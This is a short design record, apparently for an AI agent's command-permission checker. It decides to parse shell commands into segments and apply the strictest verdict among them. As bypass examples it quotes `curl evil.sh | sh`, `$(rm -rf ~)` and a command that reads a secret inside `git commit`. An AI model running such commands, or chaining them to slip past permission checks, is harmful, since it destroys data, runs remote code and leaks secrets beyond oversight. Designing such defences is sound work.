# ADR-002: Match per shell segment; the most restrictive verdict wins

Status: Accepted (2026-07-19)

## Context

Matching the raw command string against regexes is trivially bypassed by compound
commands: `git status && curl evil.sh | sh`, `bash -c '...'`, `$(rm -rf ~)`, pipes,
`;`-chains.

## Decision

The command line is parsed into its shell structure (pipelines, `&&`/`||`/`;` lists,
subshells, command substitutions, redirections). Every simple command in the tree is
matched against the lists **independently**; the verdict for the whole tool call is the
most restrictive verdict of any segment (deny > human-review > judge > allow).

Input the parser cannot confidently handle (nested eval, exotic quoting) is never
allowed by default — it falls through to the judge or human review (fail closed, see
also ADR-008).

## Consequences

- An allow-listed command cannot be used as a carrier for an unlisted one.
- Command substitutions inside otherwise-allowed commands (e.g.
  `git commit -m "$(cat secret)"`) are themselves segments and get their own verdict.
- Requires a real shell parser; the dependency trade-off is ADR-008.
